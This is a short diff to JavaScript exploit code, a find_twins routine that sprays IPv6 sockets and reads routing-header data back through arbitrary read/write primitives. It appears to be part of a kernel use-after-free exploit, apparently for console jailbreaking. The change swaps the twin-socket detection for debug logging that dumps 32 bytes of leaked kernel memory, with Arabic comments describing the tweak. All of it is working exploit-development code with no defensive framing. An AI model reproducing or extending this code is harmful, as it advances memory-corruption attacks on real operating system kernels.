@@ -796,15 +796,16 @@ function find_twins() {
     }
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0); // تعديل رقم 4
-      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-      val = read32(leak_add);
-      j = val & 0xFFFF;
-      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
-        twins[0] = i;
-        twins[1] = j;
-        log(' TWINS : [' + i + '] [' + j + ']');
-        return true;
+
+      write32(leak_add, 0);
+
+      // كبّر الطول مؤقتًا عشان نلقط أكتر من فيلد
+      get_rthdr(ipv6_socks[i], leak_rthdr, 32);
+
+      // اطبع أول 32 بايت كـ dwords
+      for (var off = 0; off < 32; off += 4) {
+        var v = read32(leak_rthdr.add(off));
+        log("i=" + i + " off=0x" + off.toString(16) + " val=0x" + hex(v));
       }
     }
     count++;
